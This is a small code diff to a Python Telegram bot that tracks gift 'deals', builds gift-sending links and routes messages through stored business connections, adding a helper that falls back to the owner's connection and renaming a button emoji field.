@@ -34,10 +34,10 @@ def ce(name, fallback):
     return f'<tg-emoji emoji-id="{E[name]}">{fallback}</tg-emoji>'
 
 def btn(text, data, emoji):
-    return {"text": text, "callback_data": data, "custom_emoji_id": E[emoji]}
+    return {"text": text, "callback_data": data, "icon_custom_emoji_id": E[emoji]}
 
 def btn_url(text, url, emoji):
-    return {"text": text, "url": url, "custom_emoji_id": E[emoji]}
+    return {"text": text, "url": url, "icon_custom_emoji_id": E[emoji]}
 
 # ==================== ХРАНИЛИЩА ====================
 deals = {}
@@ -82,6 +82,10 @@ def gs(uid):
     if uid not in users:
         users[uid] = {"lang": "ru", "cur": "stars", "hold": PAYMENT}
     return users[uid]
+
+def get_bci(uid):
+    """Получить business connection ID для пользователя"""
+    return bconns.get(uid) or bconns.get(OWNER_ID)
 
 def sm(cid, txt, kb=None, bci=None):
     d = {"chat_id": cid, "text": txt, "parse_mode": "HTML"}
@@ -148,7 +152,6 @@ def okb(did):
     }
 
 def aakb(did, h):
-    # Гарантированно убираем @ и пробелы для чистой ссылки tg://send_gift?to=username
     clean_h = str(h).replace("@", "").strip()
     gift_link = f"tg://send_gift?to={clean_h}"
     
@@ -243,7 +246,9 @@ def handle_message(msg):
         s = gs(uid)
         cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
         did = str(uuid.uuid4())[:8]
-        send_ci = bconns.get(uid) or bconns.get(OWNER_ID)
+        
+        # Получаем business connection отправителя (владельца)
+        send_ci = get_bci(uid)
 
         deals[did] = {
             "wid": uid, "lid": tid, "slug": ni["slug"], "name": ni["name"],
@@ -372,7 +377,7 @@ def handle_callback(cb):
     cid = msg.get("chat", {}).get("id", uid)
     mid = msg.get("message_id", 0)
     data = cb.get("data", "")
-    ci = msg.get("business_connection_id") or bconns.get(cid)
+    ci = msg.get("business_connection_id") or get_bci(cid)
 
     if data.startswith("check:"):
         ac(cbid, txt="🔍 Подарок пока не найден.", sa=True)
@@ -433,6 +438,7 @@ def webhook():
         elif "business_connection" in update:
             bc = update["business_connection"]
             bconns[bc["user"]["id"]] = bc["id"]
+            print(f"✅ Business connection: {bc['user']['id']} -> {bc['id']}")
     except Exception as e:
         print("Webhook error:", e)
     return jsonify({"ok": True})
